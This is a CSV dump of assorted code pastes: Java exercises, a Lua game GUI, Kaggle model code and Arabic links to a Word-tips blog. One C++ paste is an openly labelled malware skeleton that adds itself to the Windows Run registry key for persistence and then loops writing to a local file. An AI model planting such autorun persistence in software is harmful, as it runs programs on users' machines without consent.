id,title,username,language,date,content
SzUGUk6z,04. Songs,veronikaaa86,Java,Thursday 22nd of June 2023 12:41:53 PM CDT,"package objectsAndClasses;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class P04Songs {
    public static class Song {
        String typeList;
        String name;
        String time;

        public Song (String typeList, String name, String time) {
            this.typeList = typeList;
            this.name = name;
            this.time = time;
        }

        public String getName() {
            return this.name;
        }

        public String getTypeList(){
            return this.typeList;
        }

    }

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int n = Integer.parseInt(scanner.nextLine());

        List<Song> songsList = new ArrayList<>();
        for (int i = 0; i < n; i++) {
            String inputLine = scanner.nextLine();
            String[] songsArr = inputLine.split(""_"");
            String typeList = songsArr[0];
            String name = songsArr[1];
            String time = songsArr[2];

            Song currentSong = new Song(typeList, name, time);

            songsList.add(currentSong);
        }

        String command = scanner.nextLine();
        if (command.equals(""all"")) {

            for (Song song : songsList) {
                System.out.println(song.getName());
            }
        } else {
            for (Song song : songsList) {
                String currentTypeList = song.getTypeList();
                if (currentTypeList.equals(command)) {
                    System.out.println(song.getName());
                }
            }
        }
    }
}
"
fsduQLzc,app.lua,Heristos,Lua,Thursday 22nd of June 2023 12:32:38 PM CDT,"local component = require(""component"")
local event = require(""event"")
local gpu = component.gpu
local shell = require(""shell"")

-- Taille de l'écran
local largeur, hauteur = gpu.getResolution()

-- Couleurs
local couleurFond = 0xFFFFFF -- Blanc
local couleurBouton = 0x286CFF -- Bleu
local couleurTexte = 0xFFAE28 -- Doré
local couleurTexteBouton = 0xFFFFFF -- Blanc

-- Position des boutons
local bouton1X = math.floor(largeur / 2) - 10
local bouton1Y = math.floor(hauteur / 2) - 1
local bouton2X = math.floor(largeur / 2) + 1
local bouton2Y = math.floor(hauteur / 2) - 1

-- Fonction pour dessiner la GUI
local function dessinerGUI()
  -- Fond blanc
  gpu.setBackground(couleurFond)
  gpu.fill(1, 1, largeur, hauteur, "" "")

  -- Titre centré en haut (MineBank)
  local titre = ""MineBank""
  local titreX = math.floor(largeur / 2) - math.floor(#titre / 2)
  gpu.setForeground(couleurTexte)
  gpu.set(titreX, 1, titre)

  -- Bouton 1 (Register)
  gpu.setBackground(couleurBouton)
  gpu.fill(bouton1X, bouton1Y, 10, 3, "" "")
  gpu.setForeground(couleurTexteBouton)
  local texteBouton1 = ""Register""
  local bouton1TexteX = bouton1X + math.floor((10 - #texteBouton1) / 2)
  local bouton1TexteY = bouton1Y + 1
  gpu.set(bouton1TexteX, bouton1TexteY, texteBouton1)

  -- Bouton 2 (Login)
  gpu.setBackground(couleurBouton)
  gpu.fill(bouton2X, bouton2Y, 10, 3, "" "")
  gpu.setForeground(couleurTexteBouton)
  local texteBouton2 = ""Login""
  local bouton2TexteX = bouton2X + math.floor((10 - #texteBouton2) / 2)
  local bouton2TexteY = bouton2Y + 1
  gpu.set(bouton2TexteX, bouton2TexteY, texteBouton2)
end

-- Fonction pour effacer la GUI
local function effacerGUI()
  gpu.fill(bouton1X, bouton1Y, 10, 3, "" "")
  gpu.fill(bouton2X, bouton2Y, 10, 3, "" "")
end

-- Appel de la fonction pour dessiner la GUI initiale
dessinerGUI()

-- Fonction pour gérer les clics sur les boutons
local function gererClic(_, _, x, y)
  -- Vérifier si les coordonnées de clic sont à l'intérieur du bouton 1 (Register)
  if x >= bouton1X and x <= bouton1X + 9 and y >= bouton1Y and y <= bouton1Y + 2 then
    effacerGUI() -- Effacer la GUI
    shell.execute(""register.lua"") -- Exécuter le fichier ""register.lua""
  end

  -- Vérifier si les coordonnées de clic sont à l'intérieur du bouton 2 (Login)
  if x >= bouton2X and x <= bouton2X + 9 and y >= bouton2Y and y <= bouton2Y + 2 then
    effacerGUI() -- Effacer la GUI
    shell.execute(""login.lua"") -- Exécuter le fichier ""login.lua""
  end
end

-- Boucle principale pour gérer les événements
while true do
  local _, _, x, y = event.pull(""touch"")
  gererClic(_, _, x, y)
end"
kqceB8vc,mybestcode,Kostiggig,C++,Thursday 22nd of June 2023 12:06:35 PM CDT,"
#include ""framework.h""
#include ""FourthWindowsProgram.h""

#include <windows.h>
#include <iostream>
#include <conio.h>
#include <fstream>
#include <streambuf>
#include <thread>
#include <ctime>
#include <sstream>
#include <string>

#pragma warning(disable:4996)

#define APP_NAME L""FourthWindowsProgram""
#define HARDWARE_UNIQUE_ID_LENGTH 7
#define RELATIVE_PATH_TO_HARDWARE_UNIQUE_ID ""\\hardwareId.txt""

using namespace std;

/* Call if you need to remove program from autoRun */
void RemoveFromAutoRun() {
    HKEY hkey = HKEY_CURRENT_USER;
    RegOpenKey(HKEY_CURRENT_USER, L""SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run"", &hkey);
    RegDeleteValue(hkey, APP_NAME);
    RegCloseKey(hkey);
}

typedef void (*ProgramPathCallback)(string);

void getProgramAbsolutePath(ProgramPathCallback callback1, ProgramPathCallback callback2) {
    char myPath[_MAX_PATH + 1];
    wchar_t wtext[MAX_PATH];
    mbstowcs(wtext, myPath, strlen(myPath) + 1);
    LPWSTR ptr = wtext;
    GetModuleFileName(NULL, wtext, _MAX_PATH);
    wstring ws(wtext);
    string programPath = string(ws.begin(), ws.end());
    
    callback1(programPath);
    callback2(programPath);

    // to get rid of crash error: variable 'ws' is corrupted
    while (1);
}

void ExecuteMalwareCode() {
    int var = 100;
    while (1) {
        ::Sleep(1000);
        ofstream myFile;
        myFile.open(L""C:\\Users\\Kostya\\Desktop\\test\\logger2.txt"");
        myFile << ++var;
    }
}

string getAbsolutePathProgramDir(string path) {
    string lastFolder = """";
    int endIndex = 0;
    bool isCollecting = false;
    for (int i = path.length(); i >= 0; i--) {
        string currChar(1, path[i]);
        if (currChar == ""\\"") break;
        endIndex++;
    }

    string copyPath = path;
    return copyPath.substr(0, copyPath.length() - endIndex);;
}

string getHardwareId(const int len) {
    static const char alphanum[] =
        ""0123456789""
        ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""
        ""abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-:;/?"";
    string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s;
}

string getHardwareIdFromFile(string path) {
    string folderWithProgram = getAbsolutePathProgramDir(path);
    string uniqueHardwareIdFilePath = folderWithProgram + RELATIVE_PATH_TO_HARDWARE_UNIQUE_ID;

    ifstream file(uniqueHardwareIdFilePath);
    string id = """";
    getline(file, id);
    return id;
}

void CreateFileWithUniqueId(string path) {
    string hardwareId = getHardwareIdFromFile(path);
    if (hardwareId.length() < HARDWARE_UNIQUE_ID_LENGTH) {
        string folderWithProgram = getAbsolutePathProgramDir(path);
        string uniqueHardwareIdFilePath = folderWithProgram + RELATIVE_PATH_TO_HARDWARE_UNIQUE_ID;
        string hardwareId = getHardwareId(HARDWARE_UNIQUE_ID_LENGTH);

        ofstream myFile;
        myFile.open(uniqueHardwareIdFilePath);
        myFile << hardwareId;
        myFile.close();
    }
}

void AddToAutoRunCallbackAndExecute(string path)
{
    wstring progPath(path.begin(), path.end());
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", &hkey);
    LONG status = RegSetValueEx(hkey, APP_NAME, 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
    ExecuteMalwareCode();
}

void AddToAutoRunAndExecute() {
    getProgramAbsolutePath(&AddToAutoRunCallbackAndExecute, &CreateFileWithUniqueId);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow
)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    srand((unsigned)time(NULL) * getpid());
    AddToAutoRunAndExecute();

    return 0;
}
"
zc5MqufP,03. Big Factorial,veronikaaa86,Java,Thursday 22nd of June 2023 11:59:35 AM CDT,"package objectsAndClasses;

import java.math.BigInteger;
import java.util.Scanner;

public class P03BigFactorial {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int n = Integer.parseInt(scanner.nextLine());

        BigInteger result = new BigInteger(""1"");
        for (int i = 1; i <= n; i++) {
            result = result.multiply(BigInteger.valueOf(i));
        }

        System.out.println(result);
    }
}
"
JvGVB34W,"Kaggle - Intermediate ML - Compare models, create a CSV",makispaiktis,Python,Thursday 22nd of June 2023 11:50:42 AM CDT,"# **********************************************************************************
# **********************************************************************************
# 0. Function for comparing different models
# **********************************************************************************
# **********************************************************************************

def score_model(model, X_t=X_train, X_v=X_valid, y_t=y_train, y_v=y_valid):
    model.fit(X_t, y_t)
    preds = model.predict(X_v)
    return mean_absolute_error(y_v, preds)



# **********************************************************************************
# **********************************************************************************
# 1. Split the dataset
# **********************************************************************************
# **********************************************************************************

import pandas as pd
from sklearn.model_selection import train_test_split

# Read the data
X_full = pd.read_csv('../input/train.csv', index_col='Id')
X_test_full = pd.read_csv('../input/test.csv', index_col='Id')

# Obtain target and predictors
y = X_full.SalePrice
features = ['LotArea', 'YearBuilt', '1stFlrSF', '2ndFlrSF', 'FullBath', 'BedroomAbvGr', 'TotRmsAbvGrd']
X = X_full[features].copy()
X_test = X_test_full[features].copy()

# Break off validation set from training data
X_train, X_valid, y_train, y_valid = train_test_split(X, y, train_size=0.8, test_size=0.2, random_state=0)



# **********************************************************************************
# **********************************************************************************
# 2. Create 5 models of RandomForestRegressor
# **********************************************************************************
# **********************************************************************************

from sklearn.ensemble import RandomForestRegressor

# Define the models
model_1 = RandomForestRegressor(n_estimators=50, random_state=0)
model_2 = RandomForestRegressor(n_estimators=100, random_state=0)
model_3 = RandomForestRegressor(n_estimators=100, criterion='absolute_error', random_state=0)
model_4 = RandomForestRegressor(n_estimators=200, min_samples_split=20, random_state=0)
model_5 = RandomForestRegressor(n_estimators=100, max_depth=7, random_state=0)

models = [model_1, model_2, model_3, model_4, model_5]



# **********************************************************************************
# **********************************************************************************
# 3. Print the score of its model
# **********************************************************************************
# **********************************************************************************

from sklearn.metrics import mean_absolute_error

for i in range(0, len(models)):
    mae = score_model(models[i])
    print(""Model %d MAE: %d"" % (i+1, mae))
best_model = model_3


# **********************************************************************************
# **********************************************************************************
# 4. Create a new model
# **********************************************************************************
# **********************************************************************************

my_model = RandomForestRegressor()
my_model.fit(X, y)
preds_test = my_model.predict(X_test)

# Save predictions in format used for competition scoring
output = pd.DataFrame({'Id': X_test.index,'SalePrice': preds_test})
output.to_csv('submission.csv', index=False)"
0ihDZuFb,02. Sum Big Numbers,veronikaaa86,Java,Thursday 22nd of June 2023 11:46:16 AM CDT,"package objectsAndClasses;

import java.math.BigInteger;
import java.util.Scanner;

public class P02SumBigNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        BigInteger firstNum = new BigInteger(scanner.nextLine());
        BigInteger secondNum = new BigInteger(scanner.nextLine());

        BigInteger sum = firstNum.add(secondNum);

        System.out.println(sum);
    }
}
"
5dXN8QNa,كل شيء عن الحواشى السفلية فى وورد 2010,ghostman905,JavaScript,Thursday 22nd of June 2023 11:45:54 AM CDT,"ازاي تنشيء اختصار يعمل حاشية سفلية من لوحة المفاتيح؟

https://sanabelmasterr.blogspot.com/2023/06/Everything-about-footenotes-in-word-2010.html"
au1wxMqY,01. Randomize Words,veronikaaa86,Java,Thursday 22nd of June 2023 11:45:34 AM CDT,"package objectsAndClasses;

import java.util.Random;
import java.util.Scanner;

public class P01RandomizeWords {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String[] wordsArr = scanner.nextLine().split("" "");

        Random randomObj = new Random();

        for (int i = 0; i < wordsArr.length; i++) {
            int rndIndexX = randomObj.nextInt(wordsArr.length);
            int rndIndexY = randomObj.nextInt(wordsArr.length);

            String oldWord = wordsArr[rndIndexX];
            wordsArr[rndIndexX] = wordsArr[rndIndexY];
            wordsArr[rndIndexY] = oldWord;
        }

        System.out.println(String.join(System.lineSeparator(), wordsArr));
    }
}
"
CFc9s43b,طريقة عمل بسط ومقام باللغة العربية فى الوورد,ghostman905,JavaScript,Thursday 22nd of June 2023 11:44:50 AM CDT,"لو بتستخدم وورد 2010 / 2007 ، اعرف ازاي تكتب 1/2 أو أي كسر عشرى باللغة العربية .

https://sanabelmasterr.blogspot.com/2023/06/How-to-make-arabic-fractions-in-word.html"
f05s6TFk,سنابل ماستر,ghostman905,JavaScript,Thursday 22nd of June 2023 11:43:26 AM CDT,"تايبست سريع فى الكتابة عربى انجليزى ومعادلات .

https://sanabelmasterr.blogspot.com/"
